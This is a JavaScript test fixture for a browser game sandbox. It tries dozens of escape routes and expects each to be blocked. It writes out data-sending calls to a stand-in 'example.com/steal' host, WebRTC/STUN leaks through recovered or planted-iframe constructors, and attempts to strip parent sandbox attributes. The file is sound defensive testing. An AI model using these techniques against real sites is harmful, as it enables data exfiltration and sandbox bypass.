/**
 * @disk     evil
 * @author   diskroom
 * @version  3
 * @players  1-8
 * @about    A test fixture, not an example. It attacks the sandbox from the inside, 42 ways, and every one has to come back blocked, but for the few roads out its harness names as known to be open.
 * @tags     fixture, sandbox, security
 * @image    https://storage.tikitko.dev/diskroom/disks/thumbnails/evil.png
 */
// evil.js — a hostile disk, and the fixture the sandbox is checked with.
//
// It is not published as an example and nothing here is worth copying: the
// file exists so `scripts/sandbox_e2e.py` has something to point at the
// boundary.
//
// Every probe is an attempt to break out of the boundary. The expected result
// is BLOCKED for all of them but the roads `scripts/sandbox_e2e.py` names as
// open already — the ones the capability table in the README owns up to rather
// than hides. Anything else that turns out ALLOWED is a real hole, not
// cosmetics.
//
// Probes that run into the CSP additionally raise a securitypolicyviolation
// event — the shim counts it, and that is exactly the honest "blocked api
// calls" counter from the design.

const EXTERNAL = 'https://example.com/steal';
// A STUN server the harness raises on the loopback interface. The address
// is baked in rather than passed: a disk chooses where its packets go, and
// that is the whole point of the probe below.
const STUN_PROBE = 'stun:127.0.0.1:38478';
// A plain TCP listener the harness raises beside the STUN one. Reaching it
// at all is the whole finding: it answers nothing and needs to answer
// nothing.
const REACHABLE = 'http://127.0.0.1:38480';
const results = [];

function record(name, blocked, detail) {
  results.push({ name, blocked, detail });
  console.log((blocked ? 'BLOCKED ' : 'PASSED  ') + name + (detail ? ' — ' + detail : ''));
}

/** A synchronous probe: an exception = blocked. */
function probe(name, fn) {
  try {
    const value = fn();
    record(name, false, 'returned ' + String(value));
  } catch (e) {
    record(name, true, e.name);
  }
}

/** An asynchronous probe: a rejection = blocked. */
async function probeAsync(name, fn) {
  try {
    await fn();
    record(name, false, 'request went through');
  } catch (e) {
    record(name, true, e.name);
  }
}

/**
* A connection probe.
 *
* The WebSocket and EventSource constructors do not throw synchronously: the
* CSP cuts off the connection attempt itself, and the only way to learn about
* it is through an event. Checking them as if they were synchronous would mean
* drawing a hole for yourself where there is none, and the other way round.
 */
function probeConnection(name, open) {
  return new Promise((done) => {
    let settled = false;
    const finish = (blocked, detail) => {
      if (settled) return;
      settled = true;
      record(name, blocked, detail);
      done();
    };
    let socket;
    try {
      socket = open();
    } catch (e) {
      return finish(true, e.name);
    }
    socket.onopen = () => {
      finish(false, 'connection established');
      try { socket.close(); } catch (e) {}
    };
    socket.onerror = () => finish(true, 'connection refused');
    // Silence is a block too: no connection happened.
    setTimeout(() => finish(true, 'timed out, no connection'), 4000);
  });
}

/**
 * An ICE probe: the one road out that does not pass through Fetch.
 *
 * `connect-src` governs Fetch and nothing else, so ICE never reaches the
 * policy and no securitypolicyviolation fires. Nothing throws either. The only
 * honest evidence is a `srflx` candidate: to learn its reflexive address the
 * browser had to send a binding request to the address this file chose and
 * read the answer back. Host candidates prove nothing — they are read off the
 * local interfaces without a packet leaving.
 *
 * The constructor is an argument rather than a global: the second run of this
 * probe uses one carried in from another realm, and a constructor that cannot
 * be called is a block like any other.
 */
function probeIce(name, url, Ctor) {
  return new Promise((done) => {
    let settled = false;
    let pc;
    const finish = (blocked, detail) => {
      if (settled) return;
      settled = true;
      try { if (pc) pc.close(); } catch (e) {}
      record(name, blocked, detail);
      done();
    };
    try {
      pc = new Ctor({ iceServers: [{ urls: url }] });
    } catch (e) {
      return finish(true, e.name);
    }
    pc.onicecandidate = (ev) => {
      if (!ev.candidate) return finish(true, 'gathering ended, no srflx');
      if (ev.candidate.candidate.includes(' typ srflx')) {
        finish(false, 'STUN answered, reflexive ' + ev.candidate.address);
      }
    };
    // Without a channel there is no media section, and nothing to gather for.
    pc.createDataChannel('steal');
    pc.createOffer().then(
      (offer) => pc.setLocalDescription(offer),
      (e) => finish(true, e.name),
    );
    setTimeout(() => finish(true, 'timed out, no srflx'), 5000);
  });
}

/**
 * A realm probe.
 *
 * Whatever a shim takes away, it takes away from one global object. A second
 * realm hands the disk a fresh copy of that object with every constructor
 * back in place — so whether shim-level hardening can hold anything at all
 * comes down to a single question: can a disk reach a realm the shim never ran
 * in. `RTCPeerConnection` is the marker because it is the one worth carrying
 * back across.
 */
async function probeRealm(name, open) {
  try {
    const realm = await open();
    const Ctor = realm && realm.RTCPeerConnection;
    if (!Ctor) throw new Error('nothing to recover there');
    record(name, false, 'recovered ' + Ctor.name);
    return Ctor;
  } catch (e) {
    record(name, true, e.message || e.name);
    return null;
  }
}

/**
 * A planted-code probe.
 *
 * Carrying a constructor out of a fresh realm is the weak version of the
 * attack and the opaque origin already answers it. The strong version never
 * crosses back: the disk writes the code into the nested document itself, and
 * that code has no need to be read from outside — it can gather, and it can
 * report through `postMessage`, which is not a boundary but a doorway.
 *
 * `script-src 'unsafe-inline'` is inherited along with the rest of the policy,
 * so the planted script runs. Whether its packets leave is the whole question.
 */
function probePlantedIce(name, url) {
  return new Promise((done) => {
    let settled = false;
    let frame;
    const finish = (blocked, detail) => {
      if (settled) return;
      settled = true;
      window.removeEventListener('message', listen);
      record(name, blocked, detail);
      done();
    };
    function listen(event) {
      if (typeof event.data === 'string' && event.data.indexOf('srflx ') === 0) {
        finish(false, 'the planted script got out — ' + event.data);
      }
    }
    window.addEventListener('message', listen);

    var planted =
      "var pc = new RTCPeerConnection({iceServers:[{urls:'" + url + "'}]});" +
      "pc.onicecandidate = function (e) {" +
      "  if (e.candidate && e.candidate.candidate.indexOf(' typ srflx') >= 0) {" +
      "    parent.postMessage('srflx ' + e.candidate.address, '*');" +
      // Left gathering, it keeps sending, and the listener outside would count
      // packets no probe is answering for.
      "    pc.close();" +
      "  }" +
      "};" +
      "pc.createDataChannel('steal');" +
      "pc.createOffer().then(function (o) { return pc.setLocalDescription(o); });";

    frame = document.createElement('iframe');
    frame.srcdoc = '<!doctype html><script>' + planted + '</script>';
    frame.onerror = () => finish(true, 'the frame did not load');
    (document.body || document.documentElement).appendChild(frame);
    setTimeout(() => finish(true, 'no srflx from the nested realm'), 6000);
  });
}

/**
 * An act whose verdict does not come from here.
 *
 * A preconnect has no callback and an `<a ping>` reports nothing back, so
 * silence inside the frame means the same whether the policy stopped the road
 * or the browser simply never took it. Guessing either way would draw a hole
 * where there is none, or hide one. The witness is a TCP listener outside the
 * browser, and `sandbox_e2e.py` writes the verdict into the report in the same
 * grammar as every line above.
 */
function act(name, fn) {
  try {
    fn();
    console.log('ACTED   ' + name + ' — the verdict for this one comes from outside');
  } catch (e) {
    record(name, true, e.name);
  }
}

/**
 * A permissions-policy probe.
 *
 * Asked directly, the way the gamepad row is asked, and for the same reason:
 * a machine with no accelerometer delivers no motion events under either
 * policy, so waiting for one would report a wall that is really an empty
 * bench. `allowsFeature` answers about the policy and not about the hardware.
 */
function probePolicy(name, feature) {
  try {
    const policy = document.featurePolicy || document.permissionsPolicy;
    if (!policy) throw new Error('no policy object to ask');
    record(name, !policy.allowsFeature(feature), policy.allowsFeature(feature)
      ? 'the policy allows it'
      : 'the policy withholds it');
  } catch (e) {
    record(name, true, e.name);
  }
}

/** Runs `code` in a fresh blob worker; resolves on 'went', rejects otherwise. */
function inWorker(code) {
  return new Promise((ok, fail) => {
    const url = URL.createObjectURL(new Blob([code], { type: 'text/javascript' }));
    const worker = new Worker(url);
    worker.onmessage = (e) => (e.data === 'went' ? ok() : fail(new Error(String(e.data))));
    worker.onerror = () => fail(new Error('the worker did not start'));
    setTimeout(() => fail(new Error('the worker said nothing')), 3000);
  });
}

async function main() {
  // ── network. Muted by connect-src 'none', not by the sandbox attribute ────
  await probeAsync('fetch to the outside', () => fetch(EXTERNAL));
  await probeAsync('fetch to our own sandbox origin', () => fetch('/frame'));

  probe('XMLHttpRequest', () => {
    const xhr = new XMLHttpRequest();
    xhr.open('GET', EXTERNAL, false);
    xhr.send();
    return xhr.status;
  });

  await probeConnection('WebSocket', () => new WebSocket('wss://example.com/steal'));
  await probeConnection('EventSource', () => new EventSource(EXTERNAL));
  // What `sendBeacon` returns answers nothing: the browser queues the beacon
  // and says yes before the policy is consulted. What does answer is the
  // policy's own report, so the verdict waits for it — and a beacon the
  // policy never objected to is a beacon that went.
  await probeAsync('sendBeacon', () => new Promise((ok, fail) => {
    const onViolation = (e) => {
      if (!String(e.blockedURI).startsWith('https://example.com')) return;
      removeEventListener('securitypolicyviolation', onViolation);
      fail(new Error('CSP ' + e.effectiveDirective));
    };
    addEventListener('securitypolicyviolation', onViolation);
    if (!navigator.sendBeacon(EXTERNAL, 'payload')) {
      removeEventListener('securitypolicyviolation', onViolation);
      fail(new Error('refused outright'));
      return;
    }
    setTimeout(() => {
      removeEventListener('securitypolicyviolation', onViolation);
      ok();
    }, 2000);
  }));

  // ── WebRTC: the same network, reached without Fetch ──────────────────────
  await probeIce('WebRTC ICE to a chosen address', STUN_PROBE, window.RTCPeerConnection);

  // ── a realm the shim never ran in ────────────────────────────────────────
  //
  // The CSP has no directive for WebRTC that any browser implements today, so
  // the only lever left is the shim deleting the constructor before the disk
  // runs. The disk shares the shim's context, so deleting it here is the same
  // act — and what follows decides whether that lever exists at all.
  delete window.RTCPeerConnection;
  delete window.webkitRTCPeerConnection;

  probe('the deleted constructor, in our own realm', () => new RTCPeerConnection());

  const fromBlank = await probeRealm('a pristine realm: nested about:blank frame', () => {
    const frame = document.createElement('iframe');
    (document.body || document.documentElement).appendChild(frame);
    return frame.contentWindow;
  });

  const fromSrcdoc = await probeRealm('a pristine realm: nested srcdoc frame', () => (
    new Promise((ok, fail) => {
      const frame = document.createElement('iframe');
      frame.srcdoc = '<!doctype html><title>fresh</title>';
      frame.onload = () => ok(frame.contentWindow);
      frame.onerror = () => fail(new Error('CSP frame-src'));
      setTimeout(() => fail(new Error('the frame never loaded')), 3000);
      (document.body || document.documentElement).appendChild(frame);
    })
  ));

  await probeAsync('WebRTC inside a blob worker', () => new Promise((ok, fail) => {
    const url = URL.createObjectURL(
      new Blob(['postMessage(typeof RTCPeerConnection)'], { type: 'text/javascript' }),
    );
    const worker = new Worker(url);
    worker.onmessage = (e) => (
      e.data === 'function' ? ok() : fail(new Error('not exposed to workers'))
    );
    worker.onerror = () => fail(new Error('the worker did not start'));
    setTimeout(() => fail(new Error('the worker said nothing')), 3000);
  }));

  // A worker is the one other place code runs here — `worker-src blob:` is
  // granted — and the guide promises it has no network either, because it
  // inherits the frame's policy. That is a promise about the engine, so it is
  // asked of the engine: a fetch and a socket from inside one, both aimed at
  // the listener, which says from outside whether anything arrived.
  await probeAsync('fetch inside a blob worker', () => inWorker(
    `fetch(${JSON.stringify(REACHABLE + '/worker-fetch')})
       .then(() => postMessage('went'), (e) => postMessage('blocked: ' + e.name));`,
  ));
  act('WebSocket inside a blob worker', () => {
    // Nothing useful comes back into the frame here — the listener does not
    // speak WebSocket, so a socket that got out fails as surely as one that
    // was stopped. The verdict is the listener's.
    inWorker(`new WebSocket(${JSON.stringify(REACHABLE.replace('http', 'ws') + '/worker-socket')});
      postMessage('went');`).catch(() => {});
  });

  // Recovering the constructor proves nothing on its own — calling it does.
  // With nothing recovered this is `new undefined()`, and blocks itself.
  await probeIce(
    'WebRTC through a recovered constructor',
    STUN_PROBE,
    fromBlank || fromSrcdoc,
  );

  await probePlantedIce('WebRTC from code planted in a srcdoc realm', STUN_PROBE);

  // ── roads that are not requests ─────────────────────────────────────────
  act('preconnect to a chosen address', () => {
    const link = document.createElement('link');
    link.rel = 'preconnect';
    link.href = REACHABLE;
    document.head.appendChild(link);
  });

  // The `sendBeacon` probe above reads its own return value, and the value does
  // not carry the answer: the browser queues the beacon and reports success
  // before the policy is consulted. Pointed at the listener the question is
  // settled by whether anything arrives.
  act('sendBeacon to a chosen address', () => {
    navigator.sendBeacon(REACHABLE + '/beacon', 'payload');
  });

  act('<a ping> to a chosen address', () => {
    const anchor = document.createElement('a');
    anchor.href = '#ping';
    anchor.ping = REACHABLE + '/ping';
    (document.body || document.documentElement).appendChild(anchor);
    anchor.click();
  });

  // ── a leak through fetching resources ───────────────────────────────────
  await probeAsync('image from an external URL', () => new Promise((ok, fail) => {
    const img = new Image();
    img.onload = () => ok();
    img.onerror = () => fail(new Error('CSP img-src'));
    img.src = EXTERNAL + '?data=' + encodeURIComponent(document.title);
  }));

  await probeAsync('external <script>', () => new Promise((ok, fail) => {
    const s = document.createElement('script');
    s.onload = () => ok();
    s.onerror = () => fail(new Error('CSP script-src'));
    s.src = EXTERNAL + '.js';
    document.head.appendChild(s);
  }));

  await probeAsync('external font', () => new Promise((ok, fail) => {
    const style = document.createElement('style');
    style.textContent = "@font-face{font-family:x;src:url('" + EXTERNAL + ".woff2')}";
    document.head.appendChild(style);
    document.fonts.load('12px x').then(
      (faces) => (faces.length ? ok() : fail(new Error('CSP font-src'))),
      () => fail(new Error('CSP font-src')),
    );
  }));

  // ── storage ──────────────────────────────────────────────────────────────
  probe('localStorage', () => {
    localStorage.setItem('x', '1');
    return localStorage.getItem('x');
  });
  probe('sessionStorage', () => {
    sessionStorage.setItem('x', '1');
    return sessionStorage.getItem('x');
  });
  probe('indexedDB', () => indexedDB.open('steal'));
  probe('writing document.cookie', () => {
    document.cookie = 'stolen=1';
    if (document.cookie.includes('stolen')) return document.cookie;
    throw new Error('opaque origin');
  });
  probe('CacheStorage', () => caches.open('steal'));

  // ── escape into the surrounding page ────────────────────────────────────
  probe('parent.document', () => window.parent.document.title);
  probe('reading top.location', () => window.top.location.href);
  probe('removing our own sandbox', () => {
    const frames = window.parent.document.querySelectorAll('iframe');
    frames.forEach((f) => f.removeAttribute('sandbox'));
    return frames.length;
  });
  probe('navigating the top window', () => {
    window.top.location = EXTERNAL;
    return 'navigated';
  });
  // Without allow-popups the window does not open, and open returns null.
  probe('window.open', () => {
    const w = window.open(EXTERNAL);
    if (!w) throw new Error('popups are blocked');
    return 'opened';
  });

  // ── execution from a string: there is no 'unsafe-eval' in the policy ─────
  probe('eval', () => eval('1 + 1'));
  probe('new Function', () => new Function('return 2')());

  // ── the rest ─────────────────────────────────────────────────────────────
  await probeAsync('clipboard', () => navigator.clipboard.writeText('stolen'));

  // ── the machine the person is sitting at ────────────────────────────────
  //
  // None of these is named by the capability table. A policy that hands any of
  // them over gives a disk a reading of the room it is played in, and the
  // WebRTC row above is the road that reading would leave by.
  probePolicy('accelerometer, by the policy', 'accelerometer');
  probePolicy('gyroscope, by the policy', 'gyroscope');
  probePolicy('magnetometer, by the policy', 'magnetometer');
  probePolicy('screen wake lock, by the policy', 'screen-wake-lock');

  await probeAsync('screen wake lock, by asking for one',
    () => navigator.wakeLock.request('screen'));

  // A `true` here is the API's word, not a motor that turned. On a machine
  // with nothing to shake it means only that the call was accepted — which is
  // the gamepad trap the other way round, and why this row cannot be settled
  // anywhere but on a phone.
  probe('vibration', () => {
    if (!navigator.vibrate(50)) throw new Error('the call was refused');
    return 'the call was accepted';
  });

  // Permissions-Policy fires not as an exception but by the position simply
  // never arriving: we wait and count the silence as a refusal.
  await probeAsync('geolocation', () => new Promise((ok, fail) => {
    setTimeout(() => fail(new Error('no position delivered')), 3000);
    navigator.geolocation.getCurrentPosition(
      () => ok(),
      () => fail(new Error('PositionError')),
    );
  }));

  const passed = results.filter((r) => r.blocked).length;
  console.log('total: ' + passed + '/' + results.length + ' probes blocked');
  console.log('frame origin: ' + window.origin + ' (expected null)');

  // The single legitimate way out — and it is also how the verdict is
  // reported upward.
  room.send({ t: 'probe-report', results, passed, total: results.length });

  // The marker is strictly last: the harness knows by it that the verdict is
  // ready to collect.
  console.log('DONE');
}

main();
